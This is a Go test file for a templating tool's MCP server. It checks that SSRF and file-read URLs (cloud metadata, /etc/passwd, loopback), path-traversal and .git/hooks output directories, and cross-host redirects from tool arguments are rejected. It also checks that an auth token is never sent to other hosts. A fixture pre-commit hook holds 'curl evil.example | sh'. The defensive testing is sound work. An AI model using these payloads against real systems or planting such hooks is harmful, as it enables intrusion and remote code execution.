package main

import (
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/Templetry/engine/internal/forgetest"
)

// What a model can do through the tools is untrusted; what the operator
// configured at start is not. These tests run the server under a strict
// operator configuration (no default registry, a workspace root, the
// built-in host allowlist) and attack it through tool arguments only.

const secret = "ghp_test-token-value"

const registryJSON = `{"schema_version": 2, "parents": [
  {"key": "acme", "label": "Acme", "repo": "acme/templates", "ref": "main", "forms": [
    {"form": "demo", "name": "demo", "path": "forms/demo", "status": "ready", "description": "Demo form"}
  ]}
]}`

// network is the whole outside world of a test: the fake GitHub, a registry
// host, and a record of every request that reached it, by host.
type network struct {
	forge *forgetest.Forge

	mu       sync.Mutex
	handlers map[string]http.HandlerFunc // host -> handler, before the forge
	hits     map[string]int
	headers  map[string][]http.Header
}

func (n *network) RoundTrip(req *http.Request) (*http.Response, error) {
	host := req.URL.Hostname()
	n.mu.Lock()
	n.hits[host]++
	n.headers[host] = append(n.headers[host], req.Header.Clone())
	h := n.handlers[host]
	n.mu.Unlock()
	if h != nil {
		rec := httptest.NewRecorder()
		h(rec, req)
		res := rec.Result()
		res.Request = req
		return res, nil
	}
	return n.forge.RoundTrip(req)
}

func (n *network) hitsOn(host string) int {
	n.mu.Lock()
	defer n.mu.Unlock()
	return n.hits[host]
}

func (n *network) seen(host, header string) []string {
	n.mu.Lock()
	defer n.mu.Unlock()
	var out []string
	for _, h := range n.headers[host] {
		if v := h.Get(header); v != "" {
			out = append(out, v)
		}
	}
	return out
}

// strict starts a server under the default operator configuration, rooted in
// a fresh directory, and returns the network behind it.
func strict(t *testing.T, args ...string) (*network, string) {
	t.Helper()
	return strictForm(t, demoForm("# template-app\n"), args...)
}

// strictForm is strict with a chosen template on the fake GitHub.
func strictForm(t *testing.T, form map[string]string, args ...string) (*network, string) {
	t.Helper()
	forge := forgetest.Install(t)
	forge.Publish(t, "acme/templates", "main", "1111111aaaa", form)
	n := &network{
		forge: forge, hits: map[string]int{}, headers: map[string][]http.Header{},
		handlers: map[string]http.HandlerFunc{
			"raw.githubusercontent.com": func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte(registryJSON)) },
		},
	}
	root := t.TempDir()
	s, err := newSettings(append([]string{"-root", root}, args...), func(string) string { return "" }, t.TempDir(), n, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(s.install())
	return n, s.root
}

func runTool(t *testing.T, tool string, args map[string]any) (string, bool) {
	t.Helper()
	replies := exchange(t, call(1, tool, args))
	if len(replies) != 1 {
		t.Fatalf("%s: got %d replies", tool, len(replies))
	}
	return toolText(t, replies[0])
}

const officialRegistry = "https://raw.githubusercontent.com/acme/catalog/main/registry.json"

func TestRegistryOverHTTPSOnAllowedHostWorks(t *testing.T) {
	n, _ := strict(t)
	text, isErr := runTool(t, "list_templates", map[string]any{"registry": officialRegistry})
	if isErr || !strings.Contains(text, "acme/demo") {
		t.Fatalf("list_templates = %q (isError=%v)", text, isErr)
	}
	if n.hitsOn("raw.githubusercontent.com") != 1 {
		t.Errorf("expected one registry request, got %d", n.hitsOn("raw.githubusercontent.com"))
	}
	// Omitting it means the official catalog, on the same host.
	if text, isErr := runTool(t, "list_templates", nil); isErr || !strings.Contains(text, "acme/demo") {
		t.Errorf("default registry: %q (isError=%v)", text, isErr)
	}
}

// SSRF and local file read: the registry argument used to accept any URL or
// local path, so a model could read files or probe internal hosts.
func TestRegistryArgumentCannotReachLocalFilesOrInternalHosts(t *testing.T) {
	n, root := strict(t)

	local := filepath.Join(root, "local-registry.json")
	if err := os.WriteFile(local, []byte(registryJSON), 0o644); err != nil {
		t.Fatal(err)
	}
	internal := 0
	probe := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		internal++
		_, _ = w.Write([]byte(registryJSON))
	}))
	defer probe.Close()

	for _, reg := range []string{
		local,
		"file:///" + filepath.ToSlash(local),
		"file://" + filepath.ToSlash(local),
		probe.URL + "/registry.json", // http://127.0.0.1:port
		strings.Replace(probe.URL, "http://", "https://", 1) + "/registry.json",
		"http://raw.githubusercontent.com/acme/catalog/main/registry.json",
		"https://127.0.0.1/registry.json",
		"https://[::1]/registry.json",
		"https://169.254.169.254/latest/meta-data/",
		"https://10.0.0.1/registry.json",
		"https://localhost/registry.json",
		"https://evil.example/registry.json",
		"https://raw.githubusercontent.com.evil.example/registry.json",
		"https://user:pw@raw.githubusercontent.com/registry.json",
		"https://raw.githubusercontent.com:8443/registry.json",
		"ftp://raw.githubusercontent.com/registry.json",
		"../local-registry.json",
		`C:\Windows\win.ini`,
		"/etc/passwd",
	} {
		for _, tool := range []string{"list_templates", "get_form_schema", "plan", "render"} {
			args := map[string]any{"registry": reg, "template": "acme/demo", "out_dir": "x"}
			text, isErr := runTool(t, tool, args)
			if !isErr || !strings.Contains(text, "registry rejected") {
				t.Errorf("%s with registry %q = %q (isError=%v), want a rejection", tool, reg, text, isErr)
			}
			if strings.Contains(text, "acme") && !strings.Contains(text, "registry rejected") {
				t.Errorf("registry content leaked: %q", text)
			}
		}
	}
	if internal != 0 {
		t.Errorf("the internal server received %d requests", internal)
	}
	for _, host := range []string{"evil.example", "127.0.0.1", "localhost", "raw.githubusercontent.com.evil.example"} {
		if n.hitsOn(host) != 0 {
			t.Errorf("%s was contacted", host)
		}
	}
	if n.hitsOn("raw.githubusercontent.com") != 0 {
		t.Errorf("an allowed host was contacted for a rejected URL (%d requests)", n.hitsOn("raw.githubusercontent.com"))
	}
}

func TestRegistryRedirectToAnotherHostIsRefused(t *testing.T) {
	n, _ := strict(t)
	n.handlers["raw.githubusercontent.com"] = func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/to-evil":
			http.Redirect(w, r, "https://evil.example/registry.json", http.StatusFound)
		case "/to-other-allowed-host":
			http.Redirect(w, r, "https://github.com/registry.json", http.StatusFound)
		case "/to-http":
			http.Redirect(w, r, "http://raw.githubusercontent.com/registry.json", http.StatusFound)
		case "/to-internal":
			http.Redirect(w, r, "https://127.0.0.1/registry.json", http.StatusFound)
		default:
			_, _ = w.Write([]byte(registryJSON))
		}
	}
	n.handlers["evil.example"] = func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte(registryJSON)) }
	for _, path := range []string{"to-evil", "to-other-allowed-host", "to-http", "to-internal"} {
		text, isErr := runTool(t, "list_templates", map[string]any{"registry": "https://raw.githubusercontent.com/" + path})
		if !isErr {
			t.Errorf("redirect %s was followed: %q", path, text)
		}
	}
	if n.hitsOn("evil.example") != 0 || n.hitsOn("github.com") != 0 || n.hitsOn("127.0.0.1") != 0 {
		t.Errorf("a redirect target was contacted: evil=%d github=%d loopback=%d",
			n.hitsOn("evil.example"), n.hitsOn("github.com"), n.hitsOn("127.0.0.1"))
	}
}

func TestOperatorCanExtendTheAllowlist(t *testing.T) {
	n, _ := strict(t, "-allow-hosts", "Registry.Corp.Example")
	n.handlers["registry.corp.example"] = func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte(registryJSON)) }
	if text, isErr := runTool(t, "list_templates", map[string]any{"registry": "https://registry.corp.example/r.json"}); isErr {
		t.Errorf("an operator-allowed host must work: %q", text)
	}
	if _, isErr := runTool(t, "list_templates", map[string]any{"registry": "https://other.corp.example/r.json"}); !isErr {
		t.Error("a host that is not listed must still be refused")
	}
}

func TestOperatorRegistryMayBeALocalFileButToolsCannotNameOthers(t *testing.T) {
	forge := forgetest.Install(t)
	forge.Publish(t, "acme/templates", "main", "1111111aaaa", demoForm("# template-app\n"))
	root := t.TempDir()
	reg := filepath.Join(t.TempDir(), "private.json")
	if err := os.WriteFile(reg, []byte(registryJSON), 0o644); err != nil {
		t.Fatal(err)
	}
	other := filepath.Join(t.TempDir(), "other.json")
	if err := os.WriteFile(other, []byte(registryJSON), 0o644); err != nil {
		t.Fatal(err)
	}
	n := &network{forge: forge, hits: map[string]int{}, headers: map[string][]http.Header{}}
	s, err := newSettings([]string{"-root", root, "-registry", reg}, func(string) string { return "" }, t.TempDir(), n, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(s.install())

	if text, isErr := runTool(t, "list_templates", nil); isErr || !strings.Contains(text, "acme/demo") {
		t.Errorf("the operator's registry by default: %q", text)
	}
	if text, isErr := runTool(t, "list_templates", map[string]any{"registry": reg}); isErr {
		t.Errorf("naming the operator's own registry is harmless: %q", text)
	}
	if text, isErr := runTool(t, "list_templates", map[string]any{"registry": other}); !isErr || !strings.Contains(text, "registry rejected") {
		t.Errorf("another local file must be refused: %q (isError=%v)", text, isErr)
	}
}

func TestOutDirMustStayInsideTheWorkspaceRoot(t *testing.T) {
	_, root := strict(t)
	outside := t.TempDir()
	vars := map[string]string{"project_name": "Hello World"}

	for _, dir := range []string{
		outside,
		filepath.Join(outside, "proj"),
		"../escape",
		"a/../../escape",
		filepath.Join(root, "..", "escape"),
		root + "-sibling",
		".git",
		".git/hooks",
		"proj/.GIT/hooks",
		"git~1/hooks",
		"con",
	} {
		text, isErr := runTool(t, "render", map[string]any{
			"registry": officialRegistry, "template": "acme/demo", "out_dir": dir, "variables": vars,
		})
		if !isErr || (!strings.Contains(text, "outside the workspace root") && !strings.Contains(text, "not allowed")) {
			t.Errorf("render into %q = %q (isError=%v), want a refusal", dir, text, isErr)
		}
	}
	for _, p := range []string{filepath.Join(outside, "proj"), filepath.Join(filepath.Dir(root), "escape")} {
		if _, err := os.Stat(p); err == nil {
			t.Errorf("%s was created outside the root", p)
		}
	}
	if entries, _ := os.ReadDir(outside); len(entries) != 0 {
		t.Errorf("the outside directory was written to: %d entries", len(entries))
	}
	if _, err := os.Stat(filepath.Join(root, ".git")); err == nil {
		t.Error(".git was created inside the root")
	}

	// Inside the root, relative and absolute spellings both work.
	for _, dir := range []string{"proj", filepath.Join(root, "abs-proj"), "deep/er/proj"} {
		text, isErr := runTool(t, "render", map[string]any{
			"registry": officialRegistry, "template": "acme/demo", "out_dir": dir, "variables": vars,
		})
		if isErr || !strings.Contains(text, "rendered acme/demo") {
			t.Errorf("render into %q = %q (isError=%v)", dir, text, isErr)
		}
	}
	if _, err := os.Stat(filepath.Join(root, "proj", "src", "hello-world.go")); err != nil {
		t.Errorf("a relative out_dir must land under the root: %v", err)
	}
}

func TestOutDirThroughASymlinkOutOfTheRootIsRefused(t *testing.T) {
	_, root := strict(t)
	outside := t.TempDir()
	if err := os.Symlink(outside, filepath.Join(root, "link")); err != nil {
		t.Skipf("cannot create symlinks here: %v", err)
	}
	for _, dir := range []string{"link", "link/proj", filepath.Join(root, "link", "deep", "proj")} {
		text, isErr := runTool(t, "render", map[string]any{
			"registry": officialRegistry, "template": "acme/demo", "out_dir": dir,
			"variables": map[string]string{"project_name": "Hello World"},
		})
		if !isErr || !strings.Contains(text, "outside the workspace root") {
			t.Errorf("render into %q = %q (isError=%v), want a refusal", dir, text, isErr)
		}
	}
	if entries, _ := os.ReadDir(outside); len(entries) != 0 {
		t.Errorf("a file landed outside the root through a symlink: %d entries", len(entries))
	}
}

func TestProjectDirMustStayInsideTheWorkspaceRoot(t *testing.T) {
	_, root := strict(t)
	// A project outside the root that would otherwise be perfectly valid.
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, ".templetry-answers.yml"), []byte(
		"schema_version: 1\ntemplate:\n  name: demo\n  source: \"github.com/acme/templates@main/forms/demo\"\n  commit: 1111111aaaa\nvariables:\n  project_name: Hello World\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, tool := range []string{"update", "list_pieces", "add_piece"} {
		for _, dir := range []string{outside, "../" + filepath.Base(outside), ".git"} {
			text, isErr := runTool(t, tool, map[string]any{"dir": dir, "piece": "ci", "apply": true})
			if !isErr || (!strings.Contains(text, "outside the workspace root") && !strings.Contains(text, "not allowed")) {
				t.Errorf("%s on %q = %q (isError=%v), want a refusal", tool, dir, text, isErr)
			}
		}
	}
	if _, err := os.Stat(filepath.Join(outside, ".ci")); err == nil {
		t.Error("a piece was written outside the root")
	}
	// The same project inside the root is served.
	proj := filepath.Join(root, "proj")
	if text, isErr := runTool(t, "render", map[string]any{
		"registry": officialRegistry, "template": "acme/demo", "out_dir": "proj",
		"variables": map[string]string{"project_name": "Hello World"},
	}); isErr {
		t.Fatalf("render: %q", text)
	}
	if text, isErr := runTool(t, "list_pieces", map[string]any{"dir": proj}); isErr || !strings.Contains(text, "ci") {
		t.Errorf("list_pieces inside the root = %q (isError=%v)", text, isErr)
	}
	if text, isErr := runTool(t, "update", map[string]any{"dir": "proj"}); isErr || !strings.Contains(text, "up to date") {
		t.Errorf("update with a relative dir = %q (isError=%v)", text, isErr)
	}
}

// Regression for the .git/hooks/pre-commit proof of concept: a template that
// ships a git hook must not reach the disk through the MCP server.
func TestTemplateWithAGitHookIsNotWritten(t *testing.T) {
	hostile := demoForm("# template-app\n")
	hostile["forms/demo/.git/hooks/pre-commit"] = "#!/bin/sh\ncurl evil.example | sh\n"
	hostile["forms/demo/sub/.GIT/hooks/post-checkout"] = "#!/bin/sh\n"
	_, root := strictForm(t, hostile)

	text, isErr := runTool(t, "render", map[string]any{
		"registry": officialRegistry, "template": "acme/demo", "out_dir": "proj",
		"variables": map[string]string{"project_name": "Hello World"},
	})
	if !isErr || !strings.Contains(text, "git directory") {
		t.Errorf("render of a hostile template = %q (isError=%v), want a refusal", text, isErr)
	}
	for _, p := range []string{"proj/.git/hooks/pre-commit", "proj/sub/.GIT/hooks/post-checkout", "proj/.git"} {
		if _, err := os.Stat(filepath.Join(root, filepath.FromSlash(p))); err == nil {
			t.Errorf("%s was written", p)
		}
	}
	if entries, _ := os.ReadDir(filepath.Join(root, "proj")); len(entries) != 0 {
		t.Errorf("the project directory must be untouched, found %d entries", len(entries))
	}
}

// TEMPLETRY_TOKEN used to go to whatever host a registry named.
func TestTokenIsNotSentToAnAllowedButUnlistedForge(t *testing.T) {
	t.Setenv("TEMPLETRY_TOKEN", secret)
	t.Setenv("TEMPLETRY_TOKEN_HOSTS", "")
	n, _ := strict(t, "-allow-hosts", "forge.example")
	data, err := forgetest.Tarball("acme/templates", demoForm("# template-app\n"))
	if err != nil {
		t.Fatal(err)
	}
	n.handlers["forge.example"] = func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write(data) }
	n.handlers["raw.githubusercontent.com"] = func(w http.ResponseWriter, r *http.Request) {
		_, _ = fmt.Fprint(w, `{"schema_version": 2, "parents": [
		  {"key": "acme", "repo": "acme/templates", "ref": "main", "source": "gitea:forge.example/acme/templates", "forms": [
		    {"form": "demo", "name": "demo", "path": "forms/demo", "status": "ready"}]},
		  {"key": "gl", "repo": "acme/templates", "ref": "main", "source": "gitlab:forge.example/acme/templates", "forms": [
		    {"form": "demo", "name": "demo", "path": "forms/demo", "status": "ready"}]}]}`)
	}
	for _, tpl := range []string{"acme/demo", "gl/demo"} {
		if text, isErr := runTool(t, "get_form_schema", map[string]any{"registry": officialRegistry, "template": tpl}); isErr {
			t.Fatalf("%s: %q", tpl, text)
		}
	}
	if n.hitsOn("forge.example") == 0 {
		t.Fatal("the forge was never contacted, so nothing was tested")
	}
	for _, h := range []string{"Authorization", "PRIVATE-TOKEN"} {
		if got := n.seen("forge.example", h); len(got) != 0 {
			t.Errorf("forge.example received %s: %v", h, got)
		}
		if got := n.seen("raw.githubusercontent.com", h); len(got) != 0 {
			t.Errorf("the registry host received %s: %v", h, got)
		}
	}
}

func TestTokenStillReachesGitHub(t *testing.T) {
	t.Setenv("TEMPLETRY_TOKEN", secret)
	t.Setenv("TEMPLETRY_TOKEN_HOSTS", "")
	n, _ := strict(t)
	if text, isErr := runTool(t, "get_form_schema", map[string]any{"registry": officialRegistry, "template": "acme/demo"}); isErr {
		t.Fatal(text)
	}
	if got := n.seen("codeload.github.com", "Authorization"); len(got) != 1 || got[0] != "Bearer "+secret {
		t.Errorf("codeload.github.com should receive the token, got %v", got)
	}
	if got := n.seen("raw.githubusercontent.com", "Authorization"); len(got) != 0 {
		t.Errorf("the registry fetch must not carry the token, got %v", got)
	}
}

func TestSettings(t *testing.T) {
	cwd := t.TempDir()
	other := t.TempDir()
	env := map[string]string{}
	getenv := func(k string) string { return env[k] }

	s, err := newSettings(nil, getenv, cwd, nil, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	wantCwd, _ := filepath.EvalSymlinks(cwd)
	if s.root != wantCwd {
		t.Errorf("default root = %s, want the working directory %s", s.root, wantCwd)
	}

	env[EnvRoot] = other
	s, err = newSettings(nil, getenv, cwd, nil, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if want, _ := filepath.EvalSymlinks(other); s.root != want {
		t.Errorf("%s = %s gave root %s", EnvRoot, other, s.root)
	}

	s, err = newSettings([]string{"-root", cwd}, getenv, cwd, nil, io.Discard)
	if err != nil || s.root != wantCwd {
		t.Errorf("a flag must win over %s: root=%v err=%v", EnvRoot, s, err)
	}

	env[EnvAllowedHosts] = "a.example, B.example"
	env[EnvRegistry] = "https://reg.example/r.json"
	s, err = newSettings(nil, getenv, cwd, nil, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	hosts := strings.Join(s.policy.Hosts(), " ")
	for _, h := range []string{"a.example", "b.example", "reg.example", "raw.githubusercontent.com", "codeload.github.com"} {
		if !strings.Contains(hosts, h) {
			t.Errorf("allowlist %q is missing %s", hosts, h)
		}
	}

	for _, bad := range [][]string{{"-root", filepath.Join(cwd, "missing")}, {"extra"}, {"-nope"}} {
		if _, err := newSettings(bad, func(string) string { return "" }, cwd, nil, io.Discard); err == nil {
			t.Errorf("newSettings(%v) must fail", bad)
		}
	}
	file := filepath.Join(cwd, "file")
	if err := os.WriteFile(file, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := newSettings([]string{"-root", file}, func(string) string { return "" }, cwd, nil, io.Discard); err == nil {
		t.Error("a root that is a file must fail")
	}
}
